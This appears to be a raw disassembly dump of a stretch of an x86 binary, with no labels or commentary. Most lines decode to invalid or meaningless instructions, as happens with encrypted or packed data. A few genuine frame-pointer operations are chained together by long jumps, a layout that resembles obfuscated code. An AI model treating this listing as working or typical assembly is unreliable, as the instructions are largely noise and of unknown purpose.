  408281:	lea    ebp,[eax+0x24a24c75]
  408287:	int    0xe6
  408289:	(bad)  
  40828a:	push   ss
  40828b:	js     0x4082cd
  40828d:	adc    BYTE PTR [ebx],bh
  40828f:	je     0x4082f1
  408291:	dec    esi
  408292:	adc    eax,0x1d9244f
  408297:	sbb    al,0x5b
  408299:	mov    ah,0xf
  40829b:	lods   eax,DWORD PTR ds:[esi]
  40829c:	in     al,0xdd
  40829e:	mov    dh,0xfb
  4082a0:	fdiv   DWORD PTR [edx+0x6f]
  4082a3:	es ss fadd DWORD PTR ds:[edx]
  4082a8:	add    ebx,DWORD PTR [ecx]
  4082aa:	je     0x408253
  4082ac:	test   esi,ecx
  4082ae:	lods   al,BYTE PTR ds:[esi]
  4082af:	aas    
  4082b0:	rcl    BYTE PTR [edx+edi*2-0x17],0x38
  4082b5:	jmp    0xd3d4:0x5e76bfc
  4082bc:	xor    DWORD PTR [edx+0x20909743],ebx
  4082c2:	(bad)  
  4082c4:	leave  
  4082c5:	or     eax,0xed13b343
  4082ca:	or     BYTE PTR [ecx+0x49314456],dl
  4082d0:	leave  
  4082d1:	iret   
  4082d2:	loope  0x408353
  4082d4:	or     al,0x8a
  4082d6:	xor    BYTE PTR [ebp+0x42],dl
  4082d9:	add    al,0x28
  4082db:	xchg   edi,eax
  4082dc:	aam    0x8
  4082de:	push   esp
  4082df:	push   edx
  4082e0:	in     al,dx
  4082e1:	ins    DWORD PTR es:[edi],dx
  4082e2:	in     al,dx
  4082e3:	push   ds
  4082e4:	test   DWORD PTR [ebp-0x3c],ebp
  4082e7:	push   esp
  4082e8:	lods   eax,DWORD PTR ds:[esi]
  4082e9:	aaa    
  4082ea:	imul   BYTE PTR [ecx-0x62]
  4082ed:	cmp    BYTE PTR [edx+0x1b],0x8
  4082f1:	stos   BYTE PTR es:[edi],al
  4082f2:	sub    BYTE PTR [ebx],al
  4082f4:	adc    ecx,DWORD PTR [esi+0x53]
  4082f7:	pop    esi
  4082f8:	scas   al,BYTE PTR es:[edi]
  4082f9:	loope  0x4082f3
  4082fb:	mov    ch,0x5a
  4082fd:	pop    ebp
  4082fe:	mov    ebp,DWORD PTR [ebp+0x11]
  408301:	and    DWORD PTR [edi],esp
  408303:	xor    al,BYTE PTR [edx-0x34]
  408306:	mov    al,ds:0x77e4fabf
  40830b:	mov    cl,0x26
  40830d:	mov    ah,0x78
  40830f:	das    
  408310:	imul   ebx,DWORD PTR [esi-0x4c],0x724f21db
  408317:	(bad)  
  408318:	jp     0x4082bd
  40831a:	gs jp  0x4082fe
  40831d:	mov    WORD PTR [ebx-0x3d],cs
  408320:	in     al,dx
  408321:	daa    
  408322:	mov    edx,0x399e69b3
  408327:	inc    ebx
  408328:	(bad)  
  408329:	stos   BYTE PTR es:[edi],al
  40832a:	daa    
  40832b:	mov    ebp,DWORD PTR [eax+0x15119025]
  408331:	bound  eax,QWORD PTR [ecx-0x8ddc2e]
  408337:	dec    DWORD PTR [ecx-0x2c16f3ab]
  40833d:	add    BYTE PTR [eax],al
  40833f:	add    BYTE PTR [edi-0x289f28e9],al
  408345:	loopne 0x4082fe
  408347:	test   esp,0x990d6eef
  40834d:	addr16 out 0xcd,al
  408350:	clc    
  408351:	dec    ebx
  408352:	add    BYTE PTR [eax],al
  408354:	mov    ebx,0xf5000000
  408359:	pop    edi
  40835a:	push   ebx
  40835b:	mov    cl,bh
  40835d:	neg    BYTE PTR [esi-0x3]
  408360:	(bad)  
  408361:	sbb    al,BYTE PTR [edi+edx*8+0x4a2f9268]
  408368:	jo     0x40834a
  40836a:	inc    esi
  40836b:	push   edi
  40836c:	cwde   
  40836d:	mov    ebp,0x8ef506cd
  408372:	test   eax,0x3d383f56
  408377:	jo     0x408339
  408379:	int    0xee
  40837b:	imul   BYTE PTR [edi-0x16]
  40837e:	sub    esi,DWORD PTR [esi]
  408380:	mov    ecx,0x1791eefa
  408385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408386:	push   esi
  408387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408388:	dec    esp
  408389:	xchg   esi,eax
  40838a:	daa    
  40838b:	fdiv   QWORD PTR [eax+eax*4+0x2fd3d968]
  408392:	mov    ch,0x9b
  408394:	ins    DWORD PTR es:[edi],dx
  408395:	cmp    DWORD PTR [ebp-0x1a],edx
  408398:	es repz cmp ebx,edi
  40839c:	xor    al,0x7f
  40839e:	iret   
  40839f:	jae    0x408410
  4083a1:	hlt    
  4083a2:	push   esp
  4083a3:	mov    ds:0x3761d33,al
  4083a8:	call   0x9c0861e3
  4083ad:	mov    al,ds:0x8468c129
  4083b2:	aas    
  4083b3:	(bad)  [esp+esi*2+0x46]
  4083b7:	(bad)  
  4083b8:	xchg   edi,ebx
  4083ba:	cmc    
  4083bb:	sbb    BYTE PTR [edx-0x2c41f74c],ch
  4083c1:	xchg   ebp,eax
  4083c2:	outs   dx,DWORD PTR ds:[esi]
  4083c3:	fisubr DWORD PTR [edx-0x4e507c0b]
  4083c9:	add    eax,DWORD PTR [eax-0x2c]
  4083cc:	xchg   ebx,eax
  4083cd:	adc    al,BYTE PTR [edx-0x402086cc]
  4083d3:	(bad)  
  4083d4:	xchg   ecx,eax
  4083d5:	or     esp,esp
  4083d7:	loopne 0x40837f
  4083d9:	adc    eax,0xa2296da8
  4083de:	ret    0x8c2f
  4083e1:	inc    ebx
  4083e2:	ret    0x158d
  4083e5:	call   0xd6:0x980bd93e
  4083ec:	fs mov dl,0x26
  4083ef:	cmp    al,0xf1
  4083f1:	aas    
  4083f2:	xor    eax,0xc18052e1
  4083f7:	scas   eax,DWORD PTR es:[edi]
  4083f8:	mov    edx,0xae3cbf95
  4083fd:	es dec ecx
  4083ff:	lods   al,BYTE PTR ds:[esi]
  408400:	push   eax
  408401:	xchg   esp,eax
  408402:	pop    ebp
  408403:	cwde   
  408404:	mov    DWORD PTR ds:0xffdeeb0e,esi
  40840a:	adc    al,0x60
  40840c:	retf   0x1c17
  40840f:	or     eax,0x8ba8779f
  408414:	push   edi
  408415:	add    al,0x33
  408417:	push   ebp
  408418:	or     al,0xe9
  40841a:	rol    DWORD PTR [eax],cl
  40841c:	add    BYTE PTR [eax],al
  40841e:	into   
  40841f:	jmp    0xbfb0236f
  408424:	fdivp  st(1),st
  408426:	sbb    eax,0x6bbca86
  40842b:	leave  
  40842c:	shl    DWORD PTR [eax-0x4d],0x4c
  408430:	add    BYTE PTR [eax],al
  408432:	mov    ebx,0x19000000
  408437:	in     eax,dx
  408438:	out    0x3a,eax
  40843a:	jp     0x40849d
  40843c:	add    ebp,DWORD PTR [esi+0x2e9ed3d1]
  408442:	sbb    BYTE PTR [edi],cl
  408444:	pop    ds
  408445:	or     BYTE PTR [eax+0x21],dh
  408448:	pop    ecx
  408449:	mov    eax,ds:0x938b202e
  40844e:	adc    ch,dh
  408450:	hlt    
  408451:	dec    eax
  408452:	popa   
  408453:	pop    ebx
  408454:	cmp    BYTE PTR [eax+0x23a7a2d1],cl
  40845a:	dec    ebx
  40845b:	icebp  
  40845c:	ja     0x40844e
  40845e:	inc    esp
  40845f:	lahf   
  408460:	dec    eax
  408461:	inc    ebp
  408462:	add    eax,0xc4f95a8e
  408467:	xchg   esp,eax
  408468:	mov    BYTE PTR [esi-0x1378cb47],dh
  40846e:	add    ecx,DWORD PTR [esi-0x2d27a1db]
  408474:	cdq    
  408475:	push   0x746b577
  40847a:	sub    DWORD PTR [esi],0x51
  40847d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40847e:	sub    BYTE PTR [eax-0x4],0x98
  408482:	int3   
  408483:	ficom  WORD PTR [esp+eax*8-0x4365819]
  40848a:	adc    bh,BYTE PTR [edx]
  40848c:	push   esp
  40848d:	inc    esi
  40848e:	ins    BYTE PTR es:[edi],dx
  40848f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408490:	mov    dl,bl
  408492:	out    0xd3,eax
  408494:	in     al,0x90
  408496:	sub    eax,0x5299fa69
  40849b:	fwait
  40849c:	add    eax,0x4a61c0c
  4084a1:	enter  0xa000,0x3f
  4084a5:	cmp    DWORD PTR [edx+edi*1],0xffffff95
  4084a9:	pop    ecx
  4084aa:	pop    es
  4084ab:	jo     0x4084eb
  4084ad:	push   edx
  4084ae:	repz adc edi,eax
  4084b1:	retf   0xe97d
  4084b4:	and    DWORD PTR [eax-0x53d54d40],esi
  4084ba:	cmp    BYTE PTR [eax-0x72d9036e],al
  4084c0:	sbb    bl,dl
  4084c2:	hlt    
  4084c3:	test   BYTE PTR [ecx-0x55f68c5],0xfb
  4084ca:	scas   al,BYTE PTR es:[edi]
  4084cb:	fiadd  DWORD PTR [eax-0x41]
  4084ce:	push   esi
  4084cf:	push   esp
  4084d0:	xor    edi,DWORD PTR [esi-0x79edf673]
  4084d6:	fadd   DWORD PTR [edi+0x63]
  4084d9:	xchg   edi,eax
  4084da:	jae    0x408498
  4084dc:	(bad)  
  4084dd:	jmp    0xf7e:0xff4c8411
  4084e4:	or     DWORD PTR [esi+0x6],eax
  4084e7:	adc    edx,edx
  4084e9:	jbe    0x408543
  4084eb:	jo     0x408549
  4084ed:	lds    ebx,FWORD PTR [edx*8+0x33c833c7]
  4084f4:	into   
  4084f5:	mov    DWORD PTR [edi],ecx
  4084f7:	jmp    0x40a27b
  4084fc:	mov    eax,DWORD PTR [ebp-0xc]
  4084ff:	add    eax,DWORD PTR [ebp-0x4]
  408502:	jmp    0x4085da
  408507:	mov    bh,0x5c
  408509:	xchg   esi,eax
  40850a:	(bad)  
  40850c:	(bad)  
  40850e:	jle    0x4084a9
  408510:	fwait
  408511:	jge    0x4084b2
  408513:	ja     0x4084e1
  408515:	pop    ebp
  408516:	ret    
  408517:	outs   dx,BYTE PTR ds:[esi]
  408518:	dec    ebp
  408519:	add    BYTE PTR [eax],al
  40851b:	mov    ebx,0x98000000
  408520:	fsubrp st(6),st
  408522:	xor    BYTE PTR [edi-0x3e],bh
  408525:	lock and eax,0x54f7c28f
  40852b:	dec    edx
  40852c:	ins    DWORD PTR es:[edi],dx
  40852d:	rcr    edx,1
  40852f:	fadd   st(4),st
  408531:	adc    eax,0x932c957c
  408536:	call   0x5e03:0x69a59e21
  40853d:	cs mov ch,0xa0
  408540:	mov    ds:0x727a09f0,al
  408545:	fistp  WORD PTR [edx]
  408547:	cmp    al,BYTE PTR [esi]
  408549:	jmp    0x408578
  40854b:	cmp    BYTE PTR [eax+ebp*4],al
  40854e:	lock or eax,DWORD PTR [ecx-0x68]
  408552:	lea    edi,[ecx]
  408554:	ja     0x4085bc
  408556:	(bad)  
  408557:	and    esp,eax
  408559:	pminub mm6,QWORD PTR [ebx-0x15a28339]
  408560:	leave  
  408561:	popa   
  408562:	scas   eax,DWORD PTR es:[edi]
  408563:	mov    eax,0x28b8a2ba
  408568:	mov    ecx,DWORD PTR [edi+eiz*4]
  40856b:	mov    ah,0x3f
  40856d:	push   cs
  40856e:	sar    DWORD PTR [ebx+ecx*2],1
  408571:	mov    ch,0x7e
  408573:	outs   dx,DWORD PTR ds:[esi]
  408574:	push   0xd7dcf214
  408579:	dec    ecx
  40857a:	sub    ah,BYTE PTR [esi-0x6a]
  40857d:	pop    ds
  40857e:	pop    ebx
  40857f:	xchg   ebp,eax
  408580:	aas    
  408581:	stc    
  408582:	sbb    al,0x69
  408584:	mov    dh,BYTE PTR [ecx-0x519af934]
  40858a:	retf   0x824b
  40858d:	mov    dl,bl
  40858f:	ret    
  408590:	fstp   DWORD PTR [edi-0x194df5b4]
  408596:	sbb    ah,BYTE PTR ds:0x1d5af9bf
  40859c:	jmp    0xccdafa37
  4085a1:	pushf  
  4085a2:	dec    esi
  4085a3:	mov    ah,0xad
  4085a5:	scas   eax,DWORD PTR es:[edi]
  4085a6:	push   ebx
  4085a7:	lods   al,BYTE PTR ds:[esi]
  4085a8:	cmc    
  4085a9:	xlat   BYTE PTR ds:[ebx]
  4085aa:	(bad)  
  4085ab:	jmp    0x408554
  4085ad:	xchg   edx,edi
  4085af:	cs pop edi
  4085b1:	xor    ebp,ebp
  4085b3:	xor    al,0xda
  4085b5:	or     DWORD PTR [ebp-0x6d9e6f16],edx
  4085bb:	xchg   edx,eax
  4085bd:	sbb    BYTE PTR [edx-0x5cda79df],bl
  4085c3:	xor    DWORD PTR [ebx],ecx
  4085c5:	les    edx,FWORD PTR [ebx+ebp*4]
  4085c8:	or     cl,BYTE PTR [ebp-0x5a5abbba]
  4085ce:	mov    edx,0xb5ddb296
  4085d3:	mov    eax,eax
  4085d5:	je     0x4085c2
  4085d7:	xor    ch,bh
  4085d9:	dec    edi
  4085da:	mov    DWORD PTR [ebp-0x10],eax
  4085dd:	mov    eax,DWORD PTR [ebp-0x10]
  4085e0:	jmp    0x4086b8
  4085e5:	js     0x408635
  4085e7:	or     al,0x56
  4085e9:	ds push esi
  4085eb:	jp     0x40865b
  4085ed:	push   ss
  4085ee:	dec    edi
  4085ef:	or     al,0x69
  4085f1:	mov    edx,0x29699c72
  4085f6:	dec    esi
  4085f7:	add    BYTE PTR [eax],al
  4085f9:	mov    ebx,0xb9000000
  4085fe:	and    ecx,DWORD PTR [edx]
  408600:	pop    ecx
  408601:	inc    edi
  408602:	dec    eax
  408603:	test   al,0xb6
  408605:	mov    WORD PTR [edx],cs
  408607:	ds aaa 
  408609:	cmp    eax,0xecb4dc2b
  40860e:	dec    eax
  40860f:	retf   0x1623
  408612:	les    ebx,FWORD PTR ds:0xec216381
  408618:	jbe    0x40864b
  40861a:	stos   DWORD PTR es:[edi],eax
  40861b:	mov    ecx,DWORD PTR [edi+0x62909e7a]
  408621:	sbb    eax,0x5fc709d8
  408626:	leave  
  408627:	test   DWORD PTR ds:0xafcdc320,0x69cc2728
  408631:	enter  0x5f57,0x99
  408635:	aam    0x63
  408637:	xor    edi,ebx
  408639:	jmp    0x408645
  40863b:	dec    edx
  40863c:	enter  0xd042,0xc5
  408640:	jo     0x408636
  408642:	jg     0x408602
  408644:	cmp    ebx,DWORD PTR [esi-0x1b]
  408647:	mov    al,0x91
  408649:	aas    
  40864a:	or     dl,al
  40864c:	xchg   esp,eax
  40864d:	call   FWORD PTR [ecx]
  40864f:	xor    BYTE PTR [eax+0x40],bl
  408652:	push   ss
  408653:	hlt    
  408654:	or     eax,edi
  408656:	and    dl,BYTE PTR [esi-0x25]
  408659:	xor    eax,0xb49b0e09
  40865e:	(bad)  
  40865f:	(bad)  
  408660:	push   esp
  408661:	push   esp
  408662:	sbb    eax,DWORD PTR [ebp+0x6f]
  408665:	data16 aam 0x7e
  408668:	(bad)  
  408669:	fiadd  DWORD PTR ds:0xdc37e466
  40866f:	add    BYTE PTR [ebx],dh
  408671:	mov    ebx,0x67f0ac48
  408676:	ret    0x56cc
  408679:	fsub   st,st(5)
  40867b:	mov    ebx,DWORD PTR cs:[ecx]
  40867e:	pop    ss
  40867f:	jns    0x4086fa
  408681:	push   ebx
  408682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408683:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408684:	mov    ds:0x567059c4,al
  408689:	push   eax
  40868a:	pop    DWORD PTR [ebp+0x3dd80611]
  408690:	es (bad) 
  408692:	mov    edx,0xb5506c2a
  408697:	and    cl,dh
  408699:	mov    edx,0x31810a3
  40869e:	inc    eax
  40869f:	or     ebx,DWORD PTR [esi]
  4086a1:	sbb    edx,esp
  4086a3:	(bad)  
  4086a5:	cwde   
  4086a6:	mov    ebp,0x81d9f30d
  4086ab:	retf   
  4086ac:	in     al,dx
  4086ad:	mov    ds:0x544fb382,al
  4086b2:	push   es
  4086b3:	fucom  st(6)
  4086b5:	xchg   ebp,eax
  4086b6:	inc    esi
  4086b7:	inc    esp
  4086b8:	mov    eax,DWORD PTR [eax+0xc]
  4086bb:	mov    edx,DWORD PTR [ebp-0x4]
  4086be:	jmp    0x408796
  4086c3:	or     al,0x6b
  4086c5:	or     edx,esi
  4086c7:	outs   dx,DWORD PTR ds:[esi]
  4086c8:	repnz (bad) 
  4086ca:	(bad)  
  4086cb:	std    
  4086cc:	and    DWORD PTR [ebp+0x74202dc4],esp
  4086d2:	xchg   edx,eax
  4086d3:	in     al,0x4e
  4086d5:	add    BYTE PTR [eax],al
  4086d7:	mov    ebx,0x76000000
  4086dc:	test   ebx,ecx
  4086de:	or     BYTE PTR [edx+edx*4+0x2f],ch
  4086e2:	or     BYTE PTR [edx-0x19],0xcd
  4086e6:	mov    dl,0x93
  4086e8:	adc    edx,DWORD PTR [esi+0x70]
  4086eb:	movaps XMMWORD PTR [ecx+0x57],xmm1
  4086ef:	clc    
  4086f0:	ret    
  4086f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086f2:	inc    esi
  4086f3:	or     eax,0xe6109744
  4086f8:	mov    DWORD PTR [ebp-0x45499b29],esp
  4086fe:	test   al,0x30
  408700:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408701:	sbb    ah,BYTE PTR [ebx]
  408703:	daa    
  408704:	in     al,0xff
  408706:	cmp    BYTE PTR [ecx],al
  408708:	je     0x40872c
  40870a:	and    al,BYTE PTR [esi]
  40870c:	xlat   BYTE PTR ds:[ebx]
  40870d:	ja     0x40877c
  40870f:	cmp    al,BYTE PTR [esi-0x2d]
  408712:	adc    dh,BYTE PTR [ebp-0x4d]
  408715:	xchg   edi,eax
  408716:	aad    0xc1
  408718:	rcl    BYTE PTR [eax-0x5422f1fc],1
  40871e:	(bad)  
  40871f:	es lock jmp 0x2ad9:0x6cd22d8d
  408728:	and    cl,ah
  40872a:	add    BYTE PTR [ecx-0x2e],dh
  40872d:	fsubr  QWORD PTR [eax+0x33ee5522]
  408733:	mov    dh,0x49
  408735:	cmp    DWORD PTR ds:0xcc702eab,edi
  40873b:	mov    ch,0xc
  40873d:	jbe    0x40878b
  40873f:	xlat   BYTE PTR ds:[ebx]
  408740:	jp     0x408700
  408742:	(bad)  
  408743:	jnp    0x40871a
  408745:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408746:	push   edi
  408747:	mov    bh,0xb7
  408749:	ins    BYTE PTR es:[edi],dx
  40874a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40874b:	js     0x4087bd
  40874d:	stc    
  40874e:	shl    BYTE PTR [edi+0x5e22db63],1
  408754:	outs   dx,BYTE PTR ds:[esi]
  408755:	daa    
  408756:	add    ebp,ecx
  408758:	call   0x4521:0x7f9e6059
  40875f:	cld    
  408760:	sbb    BYTE PTR [esi],0xac
  408763:	push   es
  408764:	lods   eax,DWORD PTR ds:[esi]
  408765:	stos   DWORD PTR es:[edi],eax
  408766:	ret    0x788
  408769:	pop    edi
  40876a:	adc    DWORD PTR [ebp+0x63],edx
  40876d:	adc    ch,cl
  40876f:	sti    
  408770:	and    DWORD PTR [ecx],0xffffffd8
  408773:	loopne 0x4087ca
  408775:	fsubr  QWORD PTR [esi-0x6e4cd143]
  40877b:	adc    dl,BYTE PTR [edi]
  40877d:	in     eax,0xdc
  40877f:	arpl   WORD PTR [edx],cx
  408781:	and    eax,0x1e03c9f7
  408786:	add    BYTE PTR [edx+0x60d53614],ah
  40878c:	data16 xchg sp,ax
  40878f:	push   esp
  408790:	(bad)  
  408791:	mov    edi,0xe0a474ce
  408796:	movzx  eax,WORD PTR [edx+eax*1]
  40879a:	cdq    
  40879b:	add    eax,0x66479db3
  4087a0:	jmp    0x408878
  4087a5:	fimul  WORD PTR [edi+0x7f]
  4087a8:	xor    bh,bh
  4087aa:	xor    bh,bl
  4087ac:	out    dx,eax
  4087ad:	and    dl,cl
  4087af:	mov    esp,0xd348151c
  4087b4:	setg   BYTE PTR [edi+0x0]
  4087b8:	add    BYTE PTR [ebx+0x9000000],bh
  4087be:	(bad)  
  4087bf:	and    BYTE PTR [ebp+0x653434b2],bl
  4087c5:	jb     0x408756
  4087c7:	pop    es
  4087c8:	mov    ebx,?
  4087ca:	je     0x4087b6
  4087cc:	sbb    BYTE PTR [ebx+eiz*8-0x2f],0xa9
  4087d1:	dec    edi
  4087d2:	ror    ch,cl
  4087d4:	shl    DWORD PTR [edi+eiz*4+0x6e],0x88
  4087d9:	or     al,0x47
  4087db:	int3   
  4087dc:	pop    edx
  4087dd:	push   ds
  4087de:	lds    ebx,FWORD PTR ds:0x7f130f40
  4087e4:	xor    esp,edx
  4087e6:	adc    al,0x4b
  4087e8:	dec    edi
  4087e9:	sahf   
  4087ea:	test   DWORD PTR ds:0xaf4096a,0xd28ca893
  4087f4:	lods   al,BYTE PTR ds:[esi]
  4087f5:	cmp    eax,0x3ec5c059
  4087fa:	pushf  
  4087fb:	pop    ds
  4087fc:	js     0x40886b
  4087fe:	retf   0x2028
  408801:	lods   eax,DWORD PTR ds:[esi]
  408802:	mov    DWORD PTR [ecx],esi
  408804:	pusha  
  408805:	call   0x2765:0xcaa0d4af
  40880c:	out    0x41,eax
  40880e:	data16 mov BYTE PTR [esi-0x1d],0x23
  408813:	icebp  
  408814:	sbb    al,0xb7
  408816:	xchg   esi,eax
  408817:	xor    eax,0x5ebda0e1
  40881c:	push   0x23
  40881e:	cmp    DWORD PTR [edx-0x4f922a93],esp
  408824:	fadd   QWORD PTR [ebp-0x69a41c7c]
  40882a:	fxch   st(5)
  40882c:	cdq    
  40882d:	cli    
  40882e:	sub    BYTE PTR [ecx+0x65],al
  408831:	popa   
  408832:	inc    edi
  408833:	imul   ebp,DWORD PTR [ebx],0x4
  408836:	jle    0x4087ee
  408838:	dec    ecx
  408839:	push   cs
  40883a:	mov    ebp,0x45cfb221
  40883f:	jo     0x408823
  408841:	retf   
  408842:	sbb    ecx,edx
  408844:	adc    DWORD PTR [ecx],0xfffffff1
  408847:	je     0x408894
  408849:	data16 sub al,0xbd
  40884c:	mov    cs,eax
  40884e:	popf   
  40884f:	js     0x40883c
  408851:	push   ebx
  408852:	adc    eax,0x568c4230
  408857:	sub    edx,DWORD PTR [edx]
  408859:	ficomp WORD PTR [edx+0x61e0f2c7]
  40885f:	mov    edi,0xe608c642
  408864:	inc    ebp
  408865:	jmp    0x16d8:0x53cbbce8
  40886c:	in     eax,dx
  40886d:	adc    al,0x59
  40886f:	inc    edx
  408870:	pop    edx
  408871:	mov    esp,0xb4aa5d2c
  408876:	or     DWORD PTR [ecx+0x7223d281],esp
  40887c:	(bad)  
  40887d:	push   DWORD PTR [ebx]
  40887f:	ror    DWORD PTR [ecx+0x558b1c55],cl
  408885:	mov    eax,0x8b085589
  40888a:	push   ebp
  40888b:	mov    esp,0x5589c633
  408890:	or     al,0x3b
  408892:	inc    ebp
  408893:	or     BYTE PTR [edi],cl
  408895:	test   DWORD PTR [edx],esp
  408897:	pop    ss
  408898:	add    BYTE PTR [eax],al
  40889a:	jmp    0x408972
  40889f:	sub    al,BYTE PTR [eax+0x3baa19aa]
  4088a5:	mov    ebx,0x5ec00bb3
  4088aa:	pop    edi
  4088ab:	sub    DWORD PTR [edx],esi
  4088ad:	jbe    0x4088e2
  4088af:	pop    edx
  4088b0:	push   eax
  4088b1:	add    BYTE PTR [eax],al
  4088b3:	mov    ebx,0x94000000
  4088b8:	xchg   BYTE PTR [ebp+0x1b],ah
  4088bb:	xchg   DWORD PTR [ecx],edx
  4088bd:	mov    ch,0x59
  4088bf:	inc    edx
  4088c0:	mov    ss,WORD PTR ds:0x77257802
  4088c6:	dec    ebp
  4088c7:	dec    ebp
  4088c8:	push   ss
  4088c9:	mov    ebp,0x30d5bfcb
  4088ce:	or     al,0x1f
  4088d0:	cmovo  ebp,DWORD PTR [ecx+0x1b2fdb82]
  4088d7:	cld    
  4088d8:	fisub  DWORD PTR cs:[edi-0x7950bf87]
  4088df:	ins    DWORD PTR es:[edi],dx
  4088e0:	int    0xcc
  4088e2:	dec    edx
  4088e3:	jle    0x4088a5
  4088e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088e6:	(bad)  
  4088e7:	std    
  4088e8:	scas   al,BYTE PTR es:[edi]
  4088e9:	nop
  4088ea:	and    eax,0x2159a09
  4088ef:	push   edx
  4088f0:	gs jmp 0x175:0x386df10c
  4088f8:	daa    
  4088f9:	leave  
  4088fa:	mov    esp,0x5fc4f05b
  4088ff:	xlat   BYTE PTR cs:[ebx]
  408901:	je     0x40891d
  408903:	mov    ds:0x60d245fb,al
  408908:	and    cl,BYTE PTR [ebx]
  40890a:	imul   esp,DWORD PTR [ebx-0x17],0xffffffdb
  40890e:	cwde   
  40890f:	mov    al,ds:0x6b87cb5b
  408914:	mov    ebx,0x7143f28a
  408919:	repz adc ebp,DWORD PTR [ecx+edx*2-0x34]
  40891e:	fldenv [ecx-0x16]
  408921:	sbb    DWORD PTR [edx-0x7db41a67],esp
  408927:	in     eax,0x67
  408929:	push   0xffffffe0
  40892b:	mov    esi,0xbfd25253
  408930:	cmp    cl,dh
  408932:	adc    DWORD PTR [edx],ebx
  408934:	jbe    0x4088c9
  408936:	and    BYTE PTR [edx-0x93ce353],0x6d
  40893d:	lods   eax,DWORD PTR ds:[esi]
  40893e:	push   ss
  40893f:	adc    cl,BYTE PTR [ecx]
  408941:	int3   
  408942:	xlat   BYTE PTR ds:[ebx]
  408943:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408944:	mov    eax,ds:0x28a8e4d
  408949:	in     eax,0x8b
  40894b:	mov    edx,DWORD PTR [esi-0x7856491]
  408951:	xchg   ecx,eax
  408952:	outs   dx,BYTE PTR ds:[esi]
  408953:	shl    DWORD PTR [edi-0x1],cl
  408956:	and    BYTE PTR [ebx],cl
  408958:	and    al,0x0
  40895a:	mov    ds:0x878ceefb,al
  40895f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408960:	xor    BYTE PTR [ebp+ebx*1-0x2c8b4118],dh
  408967:	xor    eax,0x68598b9c
  40896c:	pusha  
  40896d:	clc    
  40896e:	push   edx
  40896f:	mov    ds:0xc28b9464,al
  408974:	cmp    DWORD PTR [ebp+0x1c],eax
  408977:	jmp    0x408a4f
  40897c:	popa   
  40897d:	xchg   edi,eax
  40897e:	xor    ebx,DWORD PTR [ebp-0x9]
  408981:	std    
  408982:	outs   dx,DWORD PTR ds:[esi]
  408983:	mov    edi,0x33f139b7
  408988:	adc    BYTE PTR [eax+0x5115e47b],0x0
  40898f:	add    BYTE PTR [ebx-0x4c000000],bh
  408995:	pusha  
  408996:	jp     0x4089a8
  408998:	outs   dx,BYTE PTR ds:[esi]
  408999:	add    dh,BYTE PTR [ecx]
  40899b:	dec    edi
  40899c:	stos   BYTE PTR es:[edi],al
  40899d:	or     ecx,DWORD PTR [ecx+0x3b]
  4089a0:	aam    0xe5
  4089a2:	jl     0x408927
  4089a4:	shl    BYTE PTR ss:[edx+0x16],1
  4089a8:	sub    ecx,ebx
  4089aa:	pop    es
  4089ab:	int3   
  4089ac:	sbb    ebp,DWORD PTR [edi]
  4089ae:	inc    edi
  4089af:	add    DWORD PTR [ebp+0x67e3fc1f],esi
  4089b5:	mov    eax,ds:0xbae86860
  4089ba:	cmp    BYTE PTR ds:0x410158da,dh
  4089c0:	and    BYTE PTR [esi+0x167f4698],al
  4089c6:	call   0x2dac:0x28340390
  4089cd:	jp     0x408a28
  4089cf:	aas    
  4089d0:	arpl   WORD PTR [eax],ax
  4089d2:	dec    ebp
  4089d3:	test   al,0x39
  4089d5:	imul   edi,edx,0x29430947
  4089db:	aam    0xd2
  4089dd:	mov    ds:0xefb0ca86,al
  4089e2:	(bad)  
  4089e3:	aaa    
  4089e4:	out    dx,al
  4089e5:	ins    DWORD PTR es:[edi],dx
  4089e6:	sub    dh,BYTE PTR [ebx+0x1ddca713]
  4089ec:	rol    DWORD PTR [edi+ebx*2+0xf],1
  4089f0:	dec    edx
  4089f1:	xor    eax,0xab9fa589
  4089f6:	adc    al,0x5
  4089f8:	jmp    0x9bbeb54b
  4089fd:	aas    
  4089fe:	adc    DWORD PTR [ebx],ebx
  408a00:	ja     0x408983
  408a02:	loop   0x4089b2
  408a04:	pop    esp
  408a05:	mov    dl,0xa4
  408a07:	sub    al,0x8b
  408a09:	lods   al,BYTE PTR ds:[esi]
  408a0a:	std    
  408a0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a0c:	jp     0x4089ef
  408a0e:	in     al,0xb2
  408a10:	imul   edx
  408a12:	jno    0x4089e6
  408a14:	and    eax,edx
  408a16:	nop
  408a17:	pop    esp
  408a18:	push   0xa5749696
  408a1d:	nop
  408a1e:	ins    DWORD PTR es:[edi],dx
  408a1f:	sbb    dh,BYTE PTR [edx-0x36]
  408a22:	or     al,0x58
  408a24:	sub    DWORD PTR [esi+0x5a],edi
  408a27:	mov    eax,0x4437cc84
  408a2c:	dec    esp
  408a2d:	inc    ebx
  408a2e:	(bad)  
  408a30:	push   0x4a88384f
  408a35:	gs push 0xdeb0c08d
  408a3b:	xchg   esp,eax
  408a3c:	add    BYTE PTR [esp+edi*4],bh
  408a3f:	int    0xf7
  408a41:	aam    0x1a
  408a43:	mov    ebx,ecx
  408a45:	rcl    DWORD PTR [edx+0x22f446ef],1
  408a4b:	push   eax
  408a4c:	sar    BYTE PTR [edi+0x67850f72],1
  408a52:	adc    eax,0xd3e90000
  408a57:	add    BYTE PTR [eax],al
  408a59:	add    BYTE PTR [esp+ebp*2],ch
  408a5c:	ror    DWORD PTR [edi-0x2f],1
  408a5f:	(bad)  
  408a60:	mov    esi,0xd896cf6f
  408a65:	xor    edx,DWORD PTR [esi]
  408a67:	xchg   ecx,eax
  408a68:	int    0xa1
  408a6a:	rcl    BYTE PTR [ecx+0x0],1
  408a6d:	add    BYTE PTR [ebx+0x47000000],bh
